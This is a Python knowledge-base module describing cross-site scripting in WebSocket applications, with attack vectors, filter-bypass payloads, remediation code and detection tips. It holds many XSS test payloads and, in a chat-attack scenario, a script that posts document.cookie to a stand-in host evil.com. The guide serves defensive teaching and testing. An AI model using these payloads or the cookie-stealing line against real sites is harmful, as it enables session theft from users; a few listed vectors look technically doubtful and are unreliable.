#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easyprotech)
Dev: Brabus
Date: Sat 25 Oct 2025 12:00:00 UTC
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: WebSocket XSS Context - Comprehensive Guide
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) in WebSocket Context",

    # Metadata for SIEM/Triage Integration
    "severity": "high",
    "cvss_score": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "websocket", "real-time", "injection", "modern-web"],

    "description": """
WebSocket XSS occurs when user input is reflected into WebSocket messages without proper sanitization.
WebSockets provide full-duplex communication channels over a single TCP connection, making them ideal
for real-time applications. However, when untrusted data is transmitted through WebSocket messages
and then reflected back to clients or processed by JavaScript, it creates critical XSS vulnerabilities.

VULNERABILITY CONTEXT:
WebSocket XSS typically happens when:
1. Server echoes user messages without sanitization
2. Real-time chat applications display messages from other users
3. Collaborative applications broadcast user input
4. Gaming platforms transmit player actions
5. Live commenting systems
6. Real-time notifications
7. Multi-user editing platforms
8. Stock trading applications
9. IoT device communication

Common in:
- Real-time chat applications
- Online gaming platforms
- Collaborative editors (Google Docs, Notion)
- Live commenting systems
- Multiplayer games
- Stock trading platforms
- Social media live feeds
- IoT dashboards
- Team communication tools

SEVERITY: HIGH
WebSocket XSS allows real-time code execution across all connected clients, potentially affecting
multiple users simultaneously. The real-time nature makes detection and response challenging.
""",

    "attack_vector": """
WEBSOCKET XSS ATTACK VECTORS:

1. MESSAGE ECHO INJECTION:
   Server-side code:
   ws.send(userMessage);  // Direct echo without sanitization

   Attack payload:
   <script>alert('XSS')</script>

   Result: All connected clients execute the script

2. USERNAME/DISPLAY NAME INJECTION:
   WebSocket protocol:
   {"type": "user_joined", "username": "USER_INPUT", "message": "joined"}

   Attack payloads:
   <script>alert(1)</script>
   <img src=x onerror=alert(1)>

3. REAL-TIME CHAT MESSAGES:
   Client sends:
   {"type": "chat", "message": "<script>alert(1)</script>"}

   Server broadcasts to all:
   {"type": "message", "from": "user", "content": "<script>alert(1)</script>"}

4. STATUS UPDATE INJECTION:
   {"type": "status", "user": "admin", "status": "<script>alert(1)</script>"}

   Displayed as: admin's status: <script>alert(1)</script>

5. FILE SHARING METADATA:
   {"type": "file_shared", "filename": "<script>alert(1)</script>", "size": 1024}

6. GAME STATE MANIPULATION:
   {"type": "game_move", "player": "USER", "move": "<script>alert(1)</script>"}

ADVANCED WEBSOCKET XSS TECHNIQUES:

7. BINARY MESSAGE INJECTION:
   WebSocket binary messages with embedded HTML:
   ws.send(new Blob(['<script>alert(1)</script>'], {type: 'text/html'}));

8. FRAGMENTED PAYLOAD ATTACK:
   Split XSS across multiple messages:
   Message 1: {"type": "chat", "msg": "<scr"}
   Message 2: {"type": "chat", "msg": "ipt>alert(1)</script>"}

9. CONTROL FRAME MANIPULATION:
   WebSocket control frames with injected data:
   - Ping/Pong frames with malicious content
   - Close frames with script injection

10. SUBPROTOCOL NEGOTIATION ATTACK:
    Subprotocol strings with XSS:
    ws = new WebSocket('ws://target.com', ['chat', '<script>alert(1)</script>']);

11. EXTENSION NEGOTIATION XSS:
    WebSocket extensions with malicious parameters:
    ws = new WebSocket('ws://target.com', ['chat'], {
        headers: {'Sec-WebSocket-Extensions': 'permessage-deflate; <script>alert(1)</script>'}
    });

12. ORIGIN HEADER MANIPULATION:
    Spoofed Origin headers leading to XSS:
    Origin: <script>alert(1)</script>

WEBSOCKET-SPECIFIC BYPASSES:

13. MESSAGE TYPE CONFUSION:
    Sending JSON but receiving HTML interpretation:
    {"type": "message", "content": "<script>alert(1)</script>"}
    Becomes: Message: <script>alert(1)</script>

14. ESCAPE SEQUENCE BYPASS:
    \\u003cscript\\u003ealert(1)\\u003c/script\\u003e
    Becomes: <script>alert(1)</script>

15. ENCODING BYPASSES:
    %3Cscript%3Ealert(1)%3C/script%3E
    Becomes: <script>alert(1)</script>

16. NULL BYTE INJECTION:
    <script>alert(1)</script>%00
    May bypass some filters

17. NEWLINE INJECTION:
    \\n<script>alert(1)</script>
    Can break parsing context

18. COMMENT-BASED INJECTION:
    <!-- <script>alert(1)</script> -->
    Hidden in HTML comments

REAL-WORLD ATTACK SCENARIOS:

19. CHAT APPLICATION ATTACK:
    - Attacker joins chat room
    - Sends <script>fetch('http://evil.com/steal', {method: 'POST', body: document.cookie})</script>
    - All users in room execute script
    - Cookies stolen from all participants

20. COLLABORATIVE EDITOR ATTACK:
    - Google Docs-style application
    - User types <script>alert('XSS')</script> as document title
    - All collaborators see alert
    - Potential for stealing auth tokens

21. GAMING PLATFORM ATTACK:
    - Multiplayer game with chat
    - Player name: <script>alert(1)</script>
    - Displayed as: Player <script>alert(1)</script> scored!
    - Affects all players in game

22. STOCK TRADING DASHBOARD:
    - Real-time stock updates
    - Symbol: <script>alert(1)</script>
    - Displayed to all traders
    - Market manipulation potential

23. IOT DEVICE CONTROL:
    - WebSocket to IoT devices
    - Device name: <script>alert(1)</script>
    - All users see script execution
    - Device hijacking potential

24. SOCIAL MEDIA LIVE FEED:
    - Real-time feed updates
    - Comment: <script>alert(1)</script>
    - All viewers affected simultaneously

WEBSOCKET XSS DETECTION:

25. MANUAL TESTING:
    - Intercept WebSocket traffic in browser dev tools
    - Send test payloads: <script>alert('XSS')</script>
    - Monitor for script execution

26. AUTOMATED SCANNING:
    - Use WebSocket clients to send payloads
    - Monitor responses for reflected content
    - Check for script execution in DOM

27. PROXY INTERCEPTION:
    - Burp Suite WebSocket interception
    - Modify messages in transit
    - Test for XSS vulnerabilities
""",

    "remediation": """
WEBSOCKET XSS DEFENSE STRATEGY:

1. MESSAGE SANITIZATION (PRIMARY DEFENSE):
   Sanitize all outbound WebSocket messages:

   Node.js Example:
   const DOMPurify = require('dompurify');
   const cleanMessage = DOMPurify.sanitize(message);

   Python (websockets library):
   import bleach
   clean_message = bleach.clean(message, tags=[], strip=True)

   Java Example:
   String cleanMessage = Jsoup.clean(message, Safelist.none());

2. JSON SCHEMA VALIDATION:
   Define strict message schemas:

   Schema validation:
   {
     "type": "object",
     "properties": {
       "type": {"type": "string", "enum": ["chat", "join", "leave"]},
       "message": {"type": "string", "maxLength": 500}
     },
     "required": ["type"],
     "additionalProperties": false
   }

3. ESCAPE USER-GENERATED CONTENT:
   HTML escape all user content:

   JavaScript:
   function escapeHtml(text) {
     const map = {'&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;'};
     return text.replace(/[&<>"']/g, m => map[m]);
   }

   Python:
   import html
   safe_content = html.escape(user_content)

4. CONTENT SECURITY POLICY (CSP):
   Enhanced CSP for WebSocket applications:

   Content-Security-Policy:
     default-src 'self';
     script-src 'self' 'nonce-{random}';
     connect-src 'self' wss: ws:;
     object-src 'none';
     base-uri 'none';

5. INPUT VALIDATION AND LENGTH LIMITS:
   Implement strict input validation:

   Maximum message length: 500 characters
   Whitelist allowed characters: alphanumeric, basic punctuation
   Block: < > & " ' and other dangerous characters
   Rate limiting: max 10 messages per minute per user

6. MESSAGE TYPE ENFORCEMENT:
   Only allow predefined message types:

   ALLOWED_TYPES = ['chat', 'join', 'leave', 'typing', 'file']
   if (!ALLOWED_TYPES.includes(message.type)) {
     ws.close(1008, 'Invalid message type');
   }

7. ORIGIN VALIDATION:
   Validate WebSocket connection origin:

   ws.on('connection', (socket, request) => {
     const origin = request.headers.origin;
     const allowedOrigins = ['https://yourdomain.com', 'https://app.yourdomain.com'];

     if (!allowedOrigins.includes(origin)) {
       socket.close(1008, 'Origin not allowed');
       return;
     }
   });

8. AUTHENTICATION AND AUTHORIZATION:
   Require authentication for WebSocket connections:

   JWT-based authentication:
   const token = socket.handshake.auth.token;
   try {
     const decoded = jwt.verify(token, SECRET);
     socket.userId = decoded.userId;
   } catch (err) {
     socket.close(1008, 'Authentication failed');
   }

9. RATE LIMITING AND THROTTLING:
   Implement connection and message rate limiting:

   Redis-based rate limiting:
   const rateLimit = await redis.incr(`ws:${userId}:messages`);
   if (rateLimit > 10) {
     socket.close(1008, 'Rate limit exceeded');
     return;
   }

10. SECURE WEBSOCKET CONFIGURATION:
    Server configuration:

    HTTPS only (WSS):
    wss://yourdomain.com/ws

    Secure headers:
    Strict-Transport-Security: max-age=31536000
    X-Content-Type-Options: nosniff
    X-Frame-Options: DENY

11. MESSAGE QUEUE SANITIZATION:
    If using message queues (Redis, RabbitMQ):

    Redis example:
    const cleanMessage = validator.escape(message);
    await redis.lpush('messages', cleanMessage);

12. CLIENT-SIDE VALIDATION:
    Validate messages on client side too:

    function validateMessage(message) {
      const maxLength = 500;
      const allowedPattern = /^[a-zA-Z0-9\s.,!?-]+$/;

      return message.length <= maxLength && allowedPattern.test(message);
    }

13. LOGGING AND MONITORING:
    Comprehensive logging:

    Log all WebSocket messages:
    logger.info('WS Message', {
      userId: socket.userId,
      message: message,
      timestamp: new Date().toISOString()
    });

    Monitor for suspicious patterns:
    if (message.includes('<script>')) {
      logger.warn('Potential XSS attempt', { userId, message });
    }

14. ERROR HANDLING:
    Proper error handling without information disclosure:

    ws.on('error', (error) => {
      logger.error('WebSocket error', { error: error.message });
      // Don't send error details to client
    });

15. REGULAR SECURITY TESTING:
    Include WebSocket testing in security assessments:

    Automated testing:
    - Send XSS payloads via WebSocket
    - Monitor for script execution
    - Test rate limiting
    - Validate authentication

    Manual testing:
    - Use browser dev tools WebSocket inspector
    - Test with various XSS payloads
    - Verify proper sanitization

16. DEPLOYMENT SECURITY:
    WebSocket-specific deployment considerations:

    Load balancer configuration:
    - Sticky sessions for WebSocket connections
    - Proper timeout settings
    - DDoS protection

    Container security:
    - Resource limits for WebSocket services
    - Network policies
    - Service mesh integration

SECURITY TESTING PAYLOADS:

Basic detection:
<script>alert('WebSocket XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

Filter bypass:
<ScRiPt>alert(1)</ScRiPt>
<img/src=x onerror=alert`1`>
<svg/onload=alert(1)>

Advanced payloads:
{{constructor.constructor('alert(1)')()}}
javascript:alert(1)
data:text/html,<script>alert(1)</script>

WEBSOCKET SECURITY HEADERS:

Sec-WebSocket-Key: (auto-generated)
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: chat
Sec-WebSocket-Extensions: (if supported)

MONITORING AND ALERTS:

Set up alerts for:
- High message frequency from single user
- Messages containing script tags
- Failed authentication attempts
- Unusual connection patterns

OWASP REFERENCES:
- OWASP WebSocket Cheat Sheet
- OWASP Testing Guide: Testing WebSockets
- CWE-79: Improper Neutralization of Input
- Real-time Web Application Security
"""
}
